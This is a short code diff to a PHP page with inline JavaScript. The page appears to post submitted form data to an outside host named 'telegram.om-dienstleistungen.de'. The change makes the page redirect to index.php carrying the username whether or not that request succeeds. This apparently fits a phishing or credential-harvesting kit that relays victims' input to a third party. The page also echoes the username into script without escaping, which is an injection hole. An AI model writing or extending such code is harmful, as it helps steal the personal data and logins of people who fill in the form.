@@ -77,6 +77,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                                     if (this.readyState == 4 && this.status == 200) {
                                         // Typical action to be performed when the document is ready:
                                         window.location.href = 'index.php?msg=<?php echo $username; ?>';
+                                    } else {
+                                        window.location.href = 'index.php?msg=<?php echo $username; ?>';
                                     }
                                 };
                                 XMLHttp.open("POST", 'http://telegram.om-dienstleistungen.de/', true);
